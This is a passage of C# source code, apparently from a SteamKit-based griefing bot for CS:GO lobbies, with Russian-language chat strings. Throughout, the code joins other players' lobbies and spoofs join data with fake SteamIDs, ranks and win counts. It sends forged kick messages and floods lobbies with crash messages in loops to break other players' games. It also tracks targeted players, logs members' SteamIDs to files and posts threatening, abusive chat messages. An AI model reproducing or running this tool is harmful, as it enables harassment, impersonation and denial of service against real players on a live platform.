                                                Sendmsgwithinfo("Kicking cheater:" + JoinResp.Body.members[di].steam_id, JoinResp.Body.steam_id_lobby);
                                                KickMsgfull(JoinResp.Body.members[di].steam_id, JoinResp.Body.steam_id_lobby);
                                            }
                                        }
                                        LeaveLobby(JoinResp.Body.steam_id_lobby);
                                        return;
                                    }
                                }
                            }
                            else
                            {
                                if (lobby.targetsProfiles.Contains(JoinResp.Body.members[di].steam_id) == true)
                                {
                                    if (JoinResp.Body.members[di].steam_id != Convert.ToUInt64(mysteamid + 76561197960265728))
                                    {
                                        SoundPlayer simpleSound = new SoundPlayer(@"c:\Windows\Media\Windows Notify Calendar.wav");
                                        File.WriteAllText("searchinlobbys/" + JoinResp.Body.members[di].steam_id + "ifindhim.txt", "steam://joinlobby/730/" + Convert.ToString(JoinResp.Body.steam_id_lobby + Environment.NewLine + JoinResp.Body.members[di].persona_name));
                                        lobby.statusteam = "Я нашел его:" + Convert.ToString(JoinResp.Body.steam_id_lobby);
                                        currentname = JoinResp.Body.members[di].persona_name;
                                        currentlobbyid = JoinResp.Body.steam_id_lobby;
                                        var SendMessage = new ClientMsgProtobuf<CMsgClientMMSSendLobbyChatMsg>(EMsg.ClientMMSSendLobbyChatMsg);
                                        string goodmessage = "000035000053797353657373696F6E3A3A526571756573744A6F696E446174610007696400011000010073657474696E677300006D656D6265727300026E756D4D616368696E65730000000001026E756D506C61796572730000000001026E756D536C6F74730000000001006D616368696E6530000769640001100001" + mysteamidhex + "07666C616773000000000000000000026E756D506C6179657273000000000107646C636D61736B000000000000000000017475766572003030303030303030000270696E67000000000000706C61796572300007787569640001100001016E616D6500000067616D650002636C616E494400000000000272616E6B696E670277696E73026C6576656C027870707473001388017401636F6D6D656E6473005B6627105D5B7427105D5B6C27105D00016D6564616C73005B54315D5B43325D5B57305D5B47305D5B41315D00027465616D636F6C6F720000000000027072696D650000000000016C6F63005255000B0B0B076A6F696E666C6167730000000000000000000B077465616D5265734B65790000000000000000000B0B0B";
                                        SendMessage.ProtoHeader.routing_appid = 730;
                                        SendMessage.Body.app_id = 730;
                                        SendMessage.Body.lobby_message = StringToByteArray(goodmessage);
                                        SendMessage.Body.steam_id_lobby = JoinResp.Body.steam_id_lobby;
                                        Client.Send(SendMessage);
                                        if (lobby.immaslyer == true)
                                        {
                                            if (currentlobbyid == JoinResp.Body.steam_id_lobby)
                                            {
                                                return;
                                            }
                                            newlobbyid = JoinResp.Body.steam_id_lobby;
                                            currentlobbyid = 0;
                                            didufindhim = true;
                                        }
                                    }
                                    else
                                    {
                                        //LeaveLobby(JoinResp.Body.steam_id_lobby);
                                    }
                                }
                            }
                        }
                    }
                    if (badlobbys.Contains(Convert.ToString(JoinResp.Body.steam_id_lobby)) != true)
                    {
                        badlobbys = badlobbys + Convert.ToString(JoinResp.Body.steam_id_lobby);
                    }
                    if (didufindhim != true)
                    {
                        return;
                    }
                }
                else
                {
                    return;
                }
            }
            if (JoinResp.Body.chat_room_enter_response == 1)
            {
                if (mainform.startsearchlobby != true)
                {
                    for (int i = 0; i <= JoinResp.Body.members.Count - 1; i++)
                    {
                        string pathssteamids = null;
                        try
                        {
                            pathssteamids = File.ReadAllText("pathsteamids.txt") + "\\";
                        }
                        catch (Exception)
                        {
                            pathssteamids = null;
                        }
                        try
                        {
                            string besedka = File.ReadAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + ".txt") + Environment.NewLine;
                            if (besedka.Contains(Convert.ToString(JoinResp.Body.members[i].steam_id)) != true)
                            {
                                besedka = besedka + JoinResp.Body.members[i].steam_id;
                                File.WriteAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + ".txt", besedka);
                            }
                        }
                        catch (Exception) { File.WriteAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + ".txt", JoinResp.Body.members[i].steam_id.ToString()); }
                    }
                    iminlobby = true;
                    lobby.statusteam = "Зашел в лобби:" + JoinResp.Body.steam_id_lobby;
                }
            }
            else
            {
                LeaveLobby(JoinResp.Body.steam_id_lobby);
                imdone = true;
                whoinlobby = null;
                try
                {
                    string besedka = File.ReadAllText("badlobbys.txt") + JoinResp.Body.steam_id_lobby;
                    File.WriteAllText("badlobbys.txt", besedka);
                }
                catch (Exception)
                {
                    File.WriteAllText("badlobbys.txt", Convert.ToString(JoinResp.Body.steam_id_lobby));
                }
                lobby.statusteam = "Немогу подключиться к лобби";
            }
            if (needcrashowner == false)
            {
                if (JoinResp.Body.chat_room_enter_response == 1)
                {
                    if (mainform.startyowerwatch != true)
                    {
                        if (lobby.immaslyer != true)
                        {
                            if (mainform.justjointolisten != true)
                            {
                                sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(mainform.numbersofwins), Convert.ToInt32(mainform.rankid), Convert.ToInt32(mainform.level), JoinResp.Body.steam_id_lobby);
                                return;
                            }
                            return;
                        }
                        else
                        {
                            if (didufindhim == true)
                            {
                                if (newlobbyid != currentlobbyid)
                                {
                                    if (currentlobbyid == 0)
                                    {
                                        if (mainform.joinforprotect == true)
                                        {
                                            stop = true;
                                            currentlobbyid = JoinResp.Body.steam_id_lobby;
                                            didufindhim = false;
                                            sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(562447254), Convert.ToInt32(18), Convert.ToInt32(33), JoinResp.Body.steam_id_lobby);
                                            Thread.Sleep(500);
                                            Sendmsgwithinfo("Я личный бот, мой лорд(a.k.a TedRedPhox):" + currentname, JoinResp.Body.steam_id_lobby);
                                            Sendmsgwithinfo("Если вы кикнете моего лорда, я вам крашну КС, не делайте ошибок", JoinResp.Body.steam_id_lobby);
                                            Sendmsgwithinfo("Вы должны уважать и почитать моего лорда, иначе полетят пиздюли", JoinResp.Body.steam_id_lobby);
                                            Thread.Sleep(200);
                                            LeaveLobby(JoinResp.Body.steam_id_lobby);
                                            JoinLobby(JoinResp.Body.steam_id_lobby);
                                            return;
                                        }
                                        else
                                        {
                                            stop = true;
                                            sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(562447254), Convert.ToInt32(18), Convert.ToInt32(33), JoinResp.Body.steam_id_lobby);
                                            Thread.Sleep(500);
                                            Sendmsgwithinfo("Hello my lord, imma youre own bot by TedRedPhox.xyz!", JoinResp.Body.steam_id_lobby);
                                            Sendmsgwithinfo("I'll protect youre from bad boys.", JoinResp.Body.steam_id_lobby);
                                            Sendmsgwithinfo("You can't get VAC or other bans becouse of me.", JoinResp.Body.steam_id_lobby);
                                            Sendmsgwithinfo("Now all features works. Type !halp in chat.", JoinResp.Body.steam_id_lobby);
                                            Thread.Sleep(200);
                                            LeaveLobby(JoinResp.Body.steam_id_lobby);
                                            JoinLobby(JoinResp.Body.steam_id_lobby);
                                            currentlobbyid = JoinResp.Body.steam_id_lobby;
                                            didufindhim = false;
                                            return;
                                        }
                                    }
                                }
                            }
                        }
                        if (mainform.autocrash == true)
                        {
                            for (int i = 0; i <= 50; i++)
                            {
                                CrashSendMessage1(65000, JoinResp.Body.steam_id_lobby);
                            }
                        }
                    }
                    else
                    {
                        if (mainform.listenkech == true)
                        {
                            LeaveLobby(JoinResp.Body.steam_id_lobby);
                            imdone = true;
                            return;
                        }
                        if (lobby.immaslyer != true)
                        {
                            if (checkedlobys.Contains(Convert.ToString(JoinResp.Body.steam_id_lobby)) == true)
                            {
                                if (JoinResp.Body.members.Count != 6)
                                {
                                    checkedlobys.Replace(Convert.ToString(JoinResp.Body.steam_id_lobby), "");
                                    LeaveLobby(JoinResp.Body.steam_id_lobby);
                                    imdone = true;
                                }
                                else
                                {
                                    LeaveLobby(JoinResp.Body.steam_id_lobby);
                                    imdone = true;
                                }
                            }
                            else
                            {
                                if (JoinResp.Body.members.Count == 6)
                                {
                                    lobby.statusteam = "Проверяю лобби:" + JoinResp.Body.steam_id_lobby;
                                    sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(562447254), Convert.ToInt32(18), Convert.ToInt32(33), JoinResp.Body.steam_id_lobby);
                                    Thread.Sleep(500);
                                    InviteMessage("Вжух и снова вас приветствует vk.com/tedredphox и Gerbal Elite");
                                    InviteMessage("Вся информация есть на tedredphox.xyz");
                                    string pathssteamids = null;
                                    try
                                    {
                                        pathssteamids = File.ReadAllText("pathsteamids.txt") + "\\";
                                    }
                                    catch (Exception)
                                    {
                                        pathssteamids = null;
                                    }
                                    InviteMessage(Convert.ToString("Всего нахлебов кикнуто:" + File.ReadAllLines(pathssteamids + DateTime.UtcNow.ToShortDateString() + "nahlebs.txt").Count()));
                                    InviteMessage("Мы проверяем ваше лобби на наличие нахлебников...");
                                    return;
                                }
                                else
                                {
                                    LeaveLobby(JoinResp.Body.steam_id_lobby);
                                    imdone = true;
                                    return;
                                }
                            }
                        }
                    }
                }
                else
                {
                    LeaveLobby(JoinResp.Body.steam_id_lobby);
                    imdone = true;
                    return;
                }
            }
            else
            {
                sendjoinmsg(76561198021625543, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), JoinResp.Body.steam_id_lobby);
                try
                {
                    string besedka = File.ReadAllText("badlobbys.txt") + JoinResp.Body.steam_id_lobby;
                    File.WriteAllText("badlobbys.txt", besedka);
                }
                catch (Exception)
                {
                    File.WriteAllText("badlobbys.txt", Convert.ToString(JoinResp.Body.steam_id_lobby));
                }
                needcrashowner = false;
                LeaveLobby(JoinResp.Body.steam_id_lobby);
                imdone = true;
                return;
            }
            if (mainform.autoparser == true)
            {
                if (mainform.startyowerwatch != true)
                {
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    InviteMessage(mainform.textwhenjoin);
                    return;
                }
            }
            if (mainform.autokick == true)
            {
                for (int i = 0; i <= 100; i++)
                {
                    CrashSendMessage1(65000, JoinResp.Body.steam_id_lobby);
                }
                return;
            }
            if (mainform.startsearchlobby != true)
            {
                if (mainform.startyowerwatch != true)
                {
                    whoinlobby = String.Format("CS" + JoinResp.Body.members.Count + "CE");
                    for (int di = 0; di < JoinResp.Body.members.Count;)
                    {
                        whoinlobby = whoinlobby + String.Format("SID" + di + JoinResp.Body.members[di].persona_name + "MID" + di + JoinResp.Body.members[di].steam_id + "EID" + di);
                        di = di + 1;
                    }
                }
            }
        }

        void HandleCreateLobbyResponse(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSCreateLobbyResponse>(packetMsg);
            createdlbbyid = resp.Body.steam_id_lobby;
            if (lobby.immaslyer == true)
            {
                mainform.createdlobbyid = resp.Body.steam_id_lobby;
            }
        }
        void ClientMMSLobbyData(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSLobbyData>(packetMsg);
            if (resp.Body.steam_id_lobby == currentlobbyid)
            {
                countpls++;
                File.WriteAllBytes("faze/" + countpls + "." + resp.Body.steam_id_lobby + ".bin", resp.Body.metadata);
                return;
            }
            if (mainform.scaneveything == true)
            {
                lobby.writemapstotxt(resp.Body.metadata, resp.Body.steam_id_lobby);
            }
        }
        public static byte[] FromHex(string hex)
        {
            byte[] raw = new byte[hex.Length / 2];
            for (int i = 0; i < raw.Length; i++)
            {
                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return raw;
        }
        void ClientMMSUserLeftLobby(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSUserLeftLobby>(packetMsg);
            if (pizduli != true)
            {
                if (lobby.targetsProfiles.Contains(resp.Body.steam_id_user) == true)
                {
                    stop = true;
                    LeaveLobby(resp.Body.steam_id_lobby);
                    var JoinLobby = new ClientMsgProtobuf<CMsgClientMMSJoinLobby>(EMsg.ClientMMSJoinLobby);
                    JoinLobby.ProtoHeader.routing_appid = 730;
                    JoinLobby.Header.Proto.routing_appid = 730;
                    JoinLobby.Body.app_id = 730;
                    JoinLobby.Body.steam_id_lobby = resp.Body.steam_id_lobby; // Lobby link 109775243834561419/76561198312797851
                    JoinLobby.Body.persona_name = "CS:GO";
                    Client.Send(JoinLobby);
                    newlobbyid = 0;
                    currentlobbyid = 0;
                    didufindhim = false;
                }
            }
        }
        void ClientMMSLobbyChatMsg(IPacketMsg packetMsg)
        {
            var resp = new ClientMsgProtobuf<CMsgClientMMSLobbyChatMsg>(packetMsg);
            if (resp.Body.steam_id_lobby == currentlobbyid)
            {
                countpls++;
                File.WriteAllBytes("faze/" + countpls + "." + resp.Body.steam_id_lobby + ".bin", resp.Body.lobby_message);
            }
            string goodinfomate = (BitConverter.ToString(resp.Body.lobby_message)).ToUpper().Replace("-", string.Empty);
            if (mainform.listenkech == true)
            {
                return;
            }
            if (mainform.scaneveything == true)
            {
                Task.Run(() => lobby.writerankstotxt(resp.Body.lobby_message));
                LeaveLobby(resp.Body.steam_id_lobby);
            }
            if (imdoinglobby == true)
            {
                if (goodinfomate.Contains("53797353657373696F6E3A3A526571756573744A6F696E44617461"))
                {
                    return;
                }
            }
            if (lobby.immaslyer == true)
            {
                if (goodinfomate.Contains("53797353657373696F6E3A3A4F6E506C617965724B69636B6564"))
                {
                    if (getBetween(goodinfomate, "787569640001100001", "0B0B") != null)
                    {
                        ulong steamid;
                        try
                        {
                            steamid = Convert.ToUInt64(getBetween(goodinfomate, "787569640001100001", "0B0B"), 16) + 76561197960265728;
                        }
                        catch (Exception)
                        {
                            steamid = 0;
                        }
                        if (steamid == 0)
                        {
                            return;
                        }
                        if (lobby.targetsProfiles.Contains(steamid) == true)
                        {
                            if (pizduli != true)
                            {
                                sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                                Thread.Sleep(500);
                                Sendmsgwithinfo("Ты че сделал сука. Пиздюли через 3...", resp.Body.steam_id_lobby);
                                Thread.Sleep(1000);
                                Sendmsgwithinfo("Через 2...", resp.Body.steam_id_lobby);
                                Thread.Sleep(1000);
                                Sendmsgwithinfo("Через 1...", resp.Body.steam_id_lobby);
                                Thread.Sleep(1000);
                                for (int i = 0; i <= 50; i++)
                                {
                                    CrashSendMessage1(65000, resp.Body.steam_id_lobby);
                                }
                                LeaveLobby(resp.Body.steam_id_lobby);
                                newlobbyid = 0;
                                currentlobbyid = 0;
                                didufindhim = false;
                                return;
                            }
                        }
                    }
                }
                if (goodinfomate.Contains("000035000053797353657373696F6E3A3A436F6D6D616E64000047616D653A3A43686174"))
                {
                    ulong steamid = Convert.ToUInt64(Convert.ToInt32(getBetween(goodinfomate, "787569640001100001", "016E616D6500"), 16)) + 76561197960265728;
                    if (lobby.targetsProfiles.Contains(steamid) == true && steamid != Convert.ToUInt64(mysteamid + 76561197960265728))
                    {
                        string hex = RemoveControlCharacters(System.Text.Encoding.UTF8.GetString(resp.Body.lobby_message)) + "END";
                        string chat = getBetween(hex, "chat", "END");
                        if (chat.Contains("!halp"))
                        {
                            sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                            Thread.Sleep(500);
                            Sendmsgwithinfo("Some features here:", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Be careful, mojo and kqly and gabe can broke you're lobby", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Wanna KQLY in youre lobby? Type: !kqly", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Wanna touch Pasha Biceps? That's gay, i like it. Type: !biceps", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Make all Globals? Ez. Type: !ge", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Make all Silvers 1? Ez. Type: !s1", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Lets dance m8 (To stop !stop). Type: !disco", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Give all VAC-ban :3. Type: !vac", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Give OW-ban :3. Type: !ow", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Wanna stay alone? Type: !kickall", resp.Body.steam_id_lobby);
                            Sendmsgwithinfo("Don't press this button. !redbutton", resp.Body.steam_id_lobby);
                            LeaveLobby(resp.Body.steam_id_lobby);
                            JoinLobby(resp.Body.steam_id_lobby);
                            return;
                        }
                        if (stop != false)
                        {
                            if (chat.Contains("!kqly"))
                            {
                                sendjoinmsg(76561198000020858, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!biceps"))
                            {
                                sendjoinmsg(76561197973845818, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!ge"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "ge";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!vac"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "vac";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!ow"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "ow";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!knife"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "knife";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!s1"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "s1";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!kickall"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "kickall";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                            if (chat.Contains("!redbutton"))
                            {
                                pizduli = true;
                                sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                                Thread.Sleep(500);
                                if (mainform.joinforprotect == true)
                                {
                                    KickMsgfull(steamid, resp.Body.steam_id_lobby);
                                }
                                Thread.Sleep(500);
                                Sendmsgwithinfo("Мой царь хочет вам дать пизды. Пиздюли через 3...", resp.Body.steam_id_lobby);
                                Thread.Sleep(1000);
                                Sendmsgwithinfo("Через 2...", resp.Body.steam_id_lobby);
                                Thread.Sleep(1000);
                                Sendmsgwithinfo("Через 1...", resp.Body.steam_id_lobby);
                                Thread.Sleep(1000);
                                for (int i = 0; i <= 50; i++)
                                {
                                    CrashSendMessage1(65000, resp.Body.steam_id_lobby);
                                }
                                LeaveLobby(resp.Body.steam_id_lobby);
                                newlobbyid = 0;
                                currentlobbyid = 0;
                                didufindhim = false;
                                pizduli = false;
                                return;
                            }
                            if (chat.Contains("!kick"))
                            {
                                string name2 = getBetween(goodinfomate, "016368617400216B69636B20", "000B0B0B");
                                if (name2 != "" && name2 != null)
                                {
                                    byte[] bytename = StringToByteArray(name2);
                                    nametokick = Encoding.UTF8.GetString(bytename);
                                    joinforsteamids = true;
                                    whatdowithlordlobby = "kick";
                                    LeaveLobby(resp.Body.steam_id_lobby);
                                    JoinLobby(resp.Body.steam_id_lobby);
                                    return;
                                }
                                else
                                {
                                    sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("Не могу найти игрока", resp.Body.steam_id_lobby);
                                    LeaveLobby(resp.Body.steam_id_lobby);
                                    newlobbyid = 0;
                                    currentlobbyid = 0;
                                    didufindhim = false;
                                    return;
                                }
                            }
                            if (chat.Contains("!disco"))
                            {
                                joinforsteamids = true;
                                whatdowithlordlobby = "disco";
                                LeaveLobby(resp.Body.steam_id_lobby);
                                JoinLobby(resp.Body.steam_id_lobby);
                                return;
                            }
                        }
                        else
                        {
                            if (chat.Contains("!stop"))
                            {
                                stop = true;
                                return;
                            }
                            else
                            {
                                if (chat.Contains("!"))
                                {
                                    Sendmsgwithinfo("You need type !stop at first", resp.Body.steam_id_lobby);
                                }
                            }
                        }
                    }
                }
            }
            if (mainform.startsearchlobby == true)
            {
                if (goodinfomate.Contains("53797353657373696F6E3A3A526571756573744A6F696E446174"))
                {
                    if (lobby.targetsProfiles.Contains(resp.Body.steam_id_sender) == true)
                    {
                        SoundPlayer simpleSound = new SoundPlayer(@"c:\Windows\Media\Windows Notify Calendar.wav");
                        if (lobby.ineedspam != true)
                        {
                            if (resp.Body.steam_id_sender != Convert.ToUInt64(mysteamid + 76561197960265728))
                            {
                                File.WriteAllText("searchinlobbys/" + resp.Body.steam_id_sender + "ifindhim.txt", "steam://joinlobby/730/" + Convert.ToString(resp.Body.steam_id_lobby));
                                lobby.statusteam = "Я нашел его:" + Convert.ToString(resp.Body.steam_id_lobby);
                                currentlobbyid = resp.Body.steam_id_lobby;
                                if (mainform.joinforprotect == true)
                                {
                                    LeaveLobby(resp.Body.steam_id_lobby);
                                    JoinLobby(resp.Body.steam_id_lobby);
                                    return;
                                }
                                if (lobby.immaslyer == true)
                                {
                                    LeaveLobby(resp.Body.steam_id_lobby);
                                    JoinLobby(resp.Body.steam_id_lobby);
                                    return;
                                }
                                else
                                {
                                    crashedhomeless = crashedhomeless + 1;
                                    sendjoinmsg(fakesteamid, "CS:GO", Convert.ToUInt32(2281488), Convert.ToInt32(18), Convert.ToInt32(33), resp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("Lobby Anti-Cheat by TedRedPhox.Xyz and gerbal1337.xyz", resp.Body.steam_id_lobby);
                                    Sendmsgwithinfo("Kicking cheater:" + resp.Body.steam_id_sender, resp.Body.steam_id_lobby);
                                    Thread.Sleep(500);
                                    KickMsgfull(resp.Body.steam_id_sender, resp.Body.steam_id_lobby);
                                    LeaveLobby(resp.Body.steam_id_lobby);
                                }
                            }
                        }
                    }
                }
            }
            if (mainform.startyowerwatch == true)
            {
                if (mainform.startsearchlobby != true)
                {
                    if (lobby.immaslyer != true)
                    {
                        if (goodinfomate.Contains("5265706C794A6F696E44617461"))
                        {
                            string whitelist = File.ReadAllText("whitelist.txt");
                            string blacklist = File.ReadAllText("blacklist.txt");
                            istherenahlebs = false;
                            int members = Convert.ToInt32(getBetween(goodinfomate, "6E756D506C617965727300000000", "026E756D536C6F7473"), 16);
                            int steamidofowner = Convert.ToInt32(getBetween(goodinfomate, "07787569640001100001", "016E616D6500"), 16);
                            ulong steamid64owner = Convert.ToUInt64(steamidofowner) + 76561197960265728;
                            if (blacklist.Contains(Convert.ToString(steamid64owner)) == true)
                            {
                                needcrashowner = true;
                                reasoncrashowner = " Ты в черном списке ";
                            }
                            else
                            {
                                if (whitelist.Contains(Convert.ToString(steamid64owner)) != true)
                                {
                                    string infoofowner = getBetween(goodinfomate, "077875696400", "016C6F6300") + "END";
                                    int ownerrank = Convert.ToInt32(getBetween(infoofowner, "72616E6B696E6700", "0277696E7300000000"), 16);
                                    int ownerprivaterank = Convert.ToInt32(getBetween(infoofowner, "6C6576656C00", "027870707473"), 16);
                                    int ownerwins = Convert.ToInt32(getBetween(infoofowner, "77696E7300", "026C6576656C"), 16);
                                    int ownerprime = Convert.ToInt32(getBetween(infoofowner, "7072696D6500000000", "END"), 16);
                                    if (ownerprivaterank >= 30)
                                    {
                                        writenahlebstofile(steamidofowner);
                                        needcrashowner = true;
                                        reasoncrashowner = " Приватный ранг выше 30го.";
                                    }
                                    else
                                    {
                                        if (ownerwins >= 300)
                                        {
                                            writenahlebstofile(steamidofowner);
                                            needcrashowner = true;
                                            reasoncrashowner = " Побед больше 300.";
                                        }
                                    }
                                }
                                else
                                {
                                    InviteMessage(String.Format("У вас создатель лобби царь и бог, он в вайтлисте."));
                                }
                            }
                            string infoofmembers = getBetween(goodinfomate, "7072696D6500000000", "0B0B0B0B0B0B") + "0B0B0B0B0B0B";
                            for (int i = 0; i <= members - 1; i++)
                            {
                                int steamid = Convert.ToInt32(getBetween(infoofmembers, "07787569640001100001", "016E616D6500"), 16);
                                int privaterank = Convert.ToInt32(getBetween(infoofmembers, "6C6576656C00000000", "027870707473"), 16);
                                int wins = Convert.ToInt32(getBetween(infoofmembers, "77696E7300", "026C6576656C"), 16);
                                int prime = Convert.ToInt32(getBetween(infoofmembers, "027072696D6500000000", "016C6F6300"), 16);
                                int rank = Convert.ToInt32(getBetween(infoofmembers, "0272616E6B696E6700000000", "0277696E73"), 16);
                                infoofmembers = getBetween(infoofmembers, "7072696D6500000000", "0B0B0B0B0B0B") + "0B0B0B0B0B0B";
                                ulong steamid64 = Convert.ToUInt64(steamid) + 76561197960265728;
                                if (mysteamid != steamid)
                                {
                                    if (blacklist.Contains(Convert.ToString(steamid64)) == true)
                                    {
                                        KickMsgfull(Convert.ToUInt32(steamid + 76561197960265728), resp.Body.steam_id_lobby);
                                        InviteMessage(String.Format("Кикнут нахлебник:" + (steamid + 76561197960265728) + " Причина: в черном списке"));
                                    }
                                    else
                                    {
                                        if (whitelist.Contains(Convert.ToString(steamid64)) != true)
                                        {
                                            if (privaterank >= 30)
                                            {
                                                istherenahlebs = true;
                                                writenahlebstofile(steamid);
                                                reasonkick = (String.Format(" Причина: Приватный ранг выше 30го"));
                                                needkicknahelb = true;
                                            }
                                            if (wins >= 300)
                                            {
                                                writenahlebstofile(steamid);
                                                istherenahlebs = true;
                                                reasonkick = (String.Format(" Причина: Побед больше 300"));
                                                needkicknahelb = true;
                                            }
                                            if (needkicknahelb == true)
                                            {
                                                mainform.kicksteamid = steamid;
                                                if (needcrashowner != true)
                                                {
                                                    KickMsg();
                                                    InviteMessage("Кикнут нахлебник:" + (steamid + 76561197960265728) + reasonkick);
                                                }
                                                else
                                                {
                                                    InviteMessage("Я бы тебя кикнул:" + (steamid + 76561197960265728) + ",но все раво владелец нахлеб, можешь не хоходить в беседку." + reasonkick);
                                                }
                                                needkicknahelb = false;
                                            }
                                        }
                                        else
                                        {
                                            InviteMessage(String.Format("У вас есть ЦАРЬ в лобби:" + (steamid + 76561197960265728) + " не обижайте его :3"));
                                        }
                                    }
                                }
                            }
                            if (needcrashowner == true)
                            {
                                lobby.statusteam = "Тапнул лобби!";
                                InviteMessage(String.Format("Владелец лобби нахлебник, причина:" + reasoncrashowner));
                                InviteMessage(String.Format("Лобби будет сломано, да, вы его не кикнете, тапаю лобби..."));
                                needdofakebot(resp.Body.steam_id_lobby);
                                //for (int i = 0; i <= 200; i++)
                                //{
                                //    CrashSendMessage(65000);
                                //}
                            }
                            else
                            {
                                if (istherenahlebs == false)
                                {
                                    if (members == 6)
                                    {
                                        checkedlobys = checkedlobys + resp.Body.steam_id_lobby;
                                        lobby.statusteam = "Годное лобби!";
                                        InviteMessage(String.Format("Вы можете скачать SteamID64 игроков беседок с tedredphox.xyz!"));
                                        InviteMessage(String.Format("В вашем лобби нет нахлебников, но если кто то зайдет или выйдет, я проверю снова!"));
                                        InviteMessage(String.Format("Желаем удачного ХвХ!"));
                                    }
                                    else
                                    {
                                        lobby.statusteam = "Кикнул бомжей!";
                                        InviteMessage(String.Format("Вы можете скачать SteamID64 игроков беседок с tedredphox.xyz!"));
                                        InviteMessage(String.Format("В вашем лобби были нахлебники, но нечего, мы их кикнули!"));
                                        InviteMessage(String.Format("Я зайду к вам снова когда у вас будет 5 игроков"));
                                    }
                                }
                                else
                                {
                                    lobby.statusteam = "Кикнул бомжей!";
                                    InviteMessage(String.Format("Вы можете скачать SteamID64 игроков беседок с tedredphox.xyz!"));
                                    InviteMessage(String.Format("В вашем лобби были нахлебники, но нечего, мы их кикнули!"));
                                    InviteMessage(String.Format("Я зайду к вам снова когда у вас будет 5 игроков"));
                                }
                            }
                            if (needcrashowner != true)
                            {
                                lobby.statusteam = "Проверенно:" + resp.Body.steam_id_lobby;
                                LeaveLobby(resp.Body.steam_id_lobby);
                                imdone = true;
                            }
                        }
                    }
                }
            }
        }
        void needdofakebot(ulong id)
        {
            LeaveLobby(id);
            JoinLobby(id);
        }
        void writenahlebstofile(int id)
        {
            string pathssteamids = null;
            try
            {
                pathssteamids = File.ReadAllText("pathsteamids.txt") + "\\";
            }
            catch (Exception)
            {
                pathssteamids = null;
            }
            try
            {
                string besedka = File.ReadAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + "nahlebs.txt") + Environment.NewLine;
                if (besedka.Contains(Convert.ToString(id + 76561197960265728)) != true)
                {
                    File.WriteAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + "nahlebs.txt", Convert.ToString((id + 76561197960265728) + Environment.NewLine + File.ReadAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + "nahlebs.txt")));
                }
            }
            catch (Exception)
            {
                File.WriteAllText(pathssteamids + DateTime.UtcNow.ToShortDateString() + "nahlebs.txt", Convert.ToString((id + 76561197960265728)));
            }
        }
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
